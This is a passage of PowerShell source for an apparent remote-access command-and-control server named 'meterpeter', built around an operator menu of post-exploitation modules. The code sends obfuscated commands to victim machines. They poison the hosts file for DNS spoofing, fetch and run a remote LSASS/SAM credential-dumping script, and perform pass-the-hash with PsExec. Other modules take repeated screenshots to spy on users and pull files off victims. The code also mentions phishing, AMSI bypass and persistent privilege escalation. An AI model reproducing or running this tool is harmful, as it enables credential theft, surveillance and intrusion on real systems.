          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Copy-Item -Path `$env:windir\system32\Drivers\etc\hosts -Destination `$env:windir\system32\Drivers\etc\hosts-backup -Force;Add-Content `$env:windir\System32\drivers\etc\hosts '$Ip_spoof $Domain_spoof';echo `"   [i] Dns Entry Added to Remote hosts File`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
        }
        If($choise_two -ieq "Default" -or $choise_two -ieq "default")
        {
          write-host " * Revert Remote hosts File To Default (Dns Spoofing)." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Move-Item -Path `$env:windir\system32\Drivers\etc\hosts-backup -Destination `$env:windir\system32\Drivers\etc\hosts -Force;echo `"   [i] Remote hosts File Reverted to Default Settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise = $Null;
        $Ip_spoof = $Null;
        $choise_two = $Null;
        $Domain_spoof = $Null;
      }
      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
      {
        write-host " * Dump Remote-Host LSASS/SAM/SYSTEM/SECURITY raw data." -ForegroundColor Green;write-host "`n";
        $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1`" -OutFile `"`$Env:TMP\DumpLsass.ps1`"|Unblock-File;powershell -WindowStyle hidden -File `$Env:TMP\DumpLsass.ps1 -Action all;Start-Sleep -Seconds 1;Remove-Item -Path `"`$Env.TMP\DumpLsass.ps1`" -Force}Else{Write-Host `" [x] Error: Administrator privileges required to dump SAM ..`"}"
      }
      If($choise -ieq "PtHash")
      { 
        ## Pass-The-Hash - Check for Module Requirements { Server::SYSTEM }
        $Server_Creds = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
        If(-not($Server_Creds) -or $Server_Creds -ieq $null){
          write-host " * Abort: 'Server' requires administrator token privileges .." -ForegroundColor Red -BackgroundColor Black;
          $Command = $Null;
        }
        else
        {
          ## Server Running as 'SYSTEM' detected ..
          write-host " - Input Remote IP address: " -NoNewline;
          $pth_remote = Read-Host;
          write-host " - Input Capture NTLM Hash: " -NoNewline;
          $pth_hash = Read-Host;
          write-host "`n   PsExec * Pass-The-Hash" -ForegroundColor green;
          write-host "   ----------------------";
          ## PtH (pass-the-hash) PsExec settings
          $Arch_x64 = $env:PROCESSOR_ARCHITECTURE|findstr /C:"64";
          If(-not($pth_remote) -or $pth_remote -ieq $null){$pth_remote = "$localIpAddress"} # For Demonstration
          If(-not($pth_hash) -or $pth_hash -ieq $null){$pth_hash = "aad3b435b51404eeaad3b435b51404ee"} # For Demonstration
          If(-not($Arch_x64) -and $Flavor -ieq "Windows")
          {
            ## Running the x86 bits version of PsExec
            $BINnAME = "$Bin"+"PsExec.exe";
            $Sec_Token = "Administrator@"+"$pth_remote";
            write-host "   PsExec.exe -hashes :$pth_hash $Sec_Token" -ForeGroundColor yellow;write-host "`n";
            $pthbin = Test-Path -Path "$BINnAME";If(-not($pthbin)){
              Write-Host "`n   [i] Not Found: $BINnAME" -ForegroundColor Red -BackgroundColor Black;
              $Command = $Null;
            }
            else
            {
              start-sleep -seconds 2;cd $Bin;.\PsExec.exe -hashes :$pth_hash $Sec_Token;
              cd $IPATH;$Command = $Null;
            }
          }
        }
      }
      If($choise -ieq "NoDrive")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Hide Drives from explorer       Client:Admin - Privileges Required";
        write-host "   Enable    Show Drives in Explorer         Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:NoDrive> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " * Hide All Drives (C:D:E:F:G) From Explorer .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' | select-Object NoDrives,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " * Display All Drives (C:D:E:F:G) In Explorer .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' -Force;Get-Item -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
        {
        $choise = $Null;
        $Command = $Null;
        }
      }
      If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
      {
        $choise = $Null;
        $Command = $Null;
      }
      $choise = $Null;
      $set_time = $Null;
      $mace_path = $Null;
    }


    If($Command -ieq "Modules")
    {
      Clear-Host;
      Write-Host "`n$Modules";
      $Command = $Null;
    }

    If($Command -ieq "Info")
    {
      Write-Host "`n$Info";
      $Command = $Null;
    }
    
    If($Command -ieq "Screenshot")
    {
        write-host "`n`n   Description" -ForegroundColor Yellow;
        write-host "   -----------";
        write-host "   This module can be used to take only one desktop screenshot or,";
        write-host "   to spy target user activity by taking more than one screenshot.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Start     Capture desktop screenshot      Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Screenshot> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Start")
        {

           [int]$Inbetween = 1
           Write-Host " - How many captures: " -NoNewline;
           [int]$Captures = Read-Host;
           
           If(-not($Captures) -or $Captures -lt 1)
           {
              [int]$Captures = 1
           }
           ElseIf($Captures -gt 1)
           {
              Write-Host " - Time between captures: " -NoNewline;
              [int]$Inbetween = Read-Host;
           }
           #Run command
           $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Out-Null;powershell -File `"`$Env:TMP\Screenshot.ps1`" -Screenshot $Captures -Delay $Inbetween;Remove-Item -Path `"`$Env:TMP\Screenshot.ps1`" -Force"
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
        {
           $Command = $Null;
           $choise_two = $Null;
        }
    }


    If($Command -ieq "Download")
    {
        write-host "`n`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   Downloading\Uploading large files will take alot of time";
        write-host "   Allways input absoluct path of the file to be downloaded";
        write-host "   The file will be stored in meterpeter C2 working directory" -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Start     Download from rhost to lhost    Client:User  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Download> " -NoNewline -ForeGroundColor Green;
        $Download_choise = Read-Host;
        If($Download_choise -ieq "Start")
        {
           Write-Host " - Download Remote File: " -NoNewline;
           $File = Read-Host;

           If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
           {
              $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
              $Command = ChkDskInternalFuncio(Char_Obf($Command));
              $Command = $Command -replace "#","$File";
              $File = $File.Split('\')[-1];
              $File = $File.Split('/')[-1];
              $File = "$IPATH$File";
              $Save = $True;
           } Else {
              Write-Host "`n";
              $File = $Null;
              $Command = $Null;
           }
      }
      If($Download_choise -ieq "Return" -or $Download_choise -ieq "cls" -or $Download_choise -ieq "Modules" -or $Download_choise -ieq "clear")
      {
         $Command = $Null;
         $Download_choise = $Null;
      }
    }

    If($Command -ieq "Upload")
    {
        write-host "`n`n   Remark" -ForegroundColor Yellow;
        write-host "   ------";
        write-host "   Downloading\Uploading large files will take alot of time";
        write-host "   Allways input absoluct path of the file to be uploaded";
        write-host "   The file will be uploaded to Client working directory" -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Start     Upload from lhost to rhost      Client:User  - Privileges required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Upload> " -NoNewline -ForeGroundColor Green;
        $Upload_choise = Read-Host;
        If($Upload_choise -ieq "Start")
        {
           Write-Host " - Upload Local File: " -NoNewline;
           $File = Read-Host;

           If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
           {

              If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
              {
                 $File = "$IPATH$File";
              }

              If(([System.IO.File]::Exists("$File")))
              {
                 $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
                 $FileBytes = "($FileBytes)";
                 $File = $File.Split('\')[-1];
                 $File = $File.Split('/')[-1];
                 $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"}";
                 $Command = ChkDskInternalFuncio(Char_Obf($Command));
                 $Command = $Command -replace "#","$File";
                 $Command = $Command -replace "@","$FileBytes";
                 $Upload = $True;
              } Else {
                 Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
                 Write-Host "   ------   ---------";
                 Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
                 $Command = $Null;
              }
           } Else {
              Write-Host "`n";
              $Command = $Null;
           }
           $File = $Null;
      }
      If($Upload_choise -ieq "Return" -or $Upload_choise -ieq "cls" -or $Upload_choise -ieq "Modules" -or $Upload_choise -ieq "clear")
      {
         $Command = $Null;
         $Upload_choise = $Null;
      }
    }

    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [x] Connection Lost with $Remote_Host !" -ForegroundColor Red -BackGroundColor white;
        $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
        Start-Sleep -Seconds 4;
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }
      $WaitData = $True;
    }

    If($Command -ieq "Exit")
    {
      write-Host "`n";
      Write-Host "[x] Closing Connection with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
      $check = Test-Path -Path "$env:LocalAppData\webroot\";
      If($check -ieq $True)
      {
        Start-Sleep -Seconds 2;
        write-host "[i] Deleted: '$env:LocalAppData\webroot\'" -ForegroundColor Yellow;
        cmd /R rmdir /Q /S "%LocalAppData%\webroot\";
        $bath = "$IPATH"+"WStore.vbs";
        $bathtwo = "$IPATH"+"$payload_name.ps1";
        $ck_one = Test-Path -Path "$bath";
        $ck_two = Test-Path -Path "$bathtwo";
        If($ck_one -ieq $True){write-host "[i] Deleted: '$bath'" -ForegroundColor Yellow;cmd /R del /Q /F "$bath"}
        If($ck_two -ieq $True){write-host "[i] Deleted: '$bathtwo'" -ForegroundColor Yellow;cmd /R del /Q /F "$bathtwo"}
      }
      Start-Sleep -Seconds 3;
      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -ieq "Clear" -or $Command -ieq "Cls" -or $Command -ieq "Clear-Host" -or $Command -ieq "return" -or $Command -ieq "modules")
    {
      Clear-Host;
      #Write-Host "`n$Modules";
    }
    $Command = $Null;
  }

  If($WaitData)
  {
    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
              $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
              Start-Sleep -Seconds 5;
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [x] Connection Lost with $Remote_Host!" -ForegroundColor Red -BackGroundColor white;
          $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
          Start-Sleep -Seconds 5;
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($Info))
      {
        $Info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($Upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   saved    $File";
            $Command = $Null;
          } Else {
            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
            Write-Host "   ------   ---------";
            Write-Host "   Failed   $File (Already Exists)" -ForegroundColor Red;
            $Command = $Null;
          }
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   File Missing" -ForegroundColor Red;
          $Command = $Null;
        }
        $File = $Null;
        $Save = $False;
        $Command = $Null; 
      }

      If($Upload)
      {
        If($OutPut -ne " ")
        {
          If($Cam_set -ieq "True")
          {
            $OutPut = $OutPut|findstr /s /I /C:"Device name:";
            write-host "`n`n    WebCam(s) Detected" -ForeGroundColor Green;
            write-host "    ------------------";
            Write-Host "  $OutPut";
            $Cam_set = "False";

          }ElseIf($SluiEOP -ieq "True"){
          
            cd mimiRatz
            ## Revert SluiEOP [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path SluiEOP.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut"
            $SluiEOP = "False"

         }ElseIf($COMEOP -ieq "True"){

            cd mimiRatz
            ## Revert CompDefault [<MakeItPersistence>] to defalt [<False>]
            $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
            If($CheckValue -match 'True'){((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path CompDefault.ps1 -Force}
            cd ..

            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            write-host "   ------   -----------"
            Write-Host "   Saved    $OutPut"
            $COMEOP = "False"

          }else{
            $OutPut = $OutPut -replace "`n","";
            If($OutPut -match "GetBrowsers.ps1"){
                $sanitize = $OutPut -replace 'GetBrowsers.ps1','GetBrowsers.ps1 '
                $OutPut = $sanitize.split(' ')[0] # Get only the 1º upload path
            }
            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
            Write-Host "   ------   -----------";
            Write-Host "   saved    $OutPut";
          }
          If($Tripflop -ieq "True")
          {
            Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full" -ForeGroundColor Yellow;
            $Tripflop = "False";
          }
          If($Flipflop -ieq "True")
          {
            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
            $Flipflop = "False";
          }
          If($Camflop  -ieq "True")
          {
            write-host "   image    `$env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
            $Camflop = "False";
          }
          If($Phishing  -ieq "True")
          {
            $OutPut = $OutPut -replace ".ps1",".log";
            write-host "   output   $OutPut";
            $Phishing = "False";
          }
          If($NewPhishing  -ieq "True")
          {
            $OutPut = $OutPut -replace "NewPhish.ps1","CredsPhish.log";
            write-host "   output   $OutPut";
            $NewPhishing = "False";
          }
          $Command = $Null;
        } Else {
          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
          Write-Host "   ------   ---------";
          Write-Host "   Failed   $File (Already Exists Remote)" -ForeGroundColor red;
          $Command = $Null;
        }
        $Upload = $False;
      }
    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}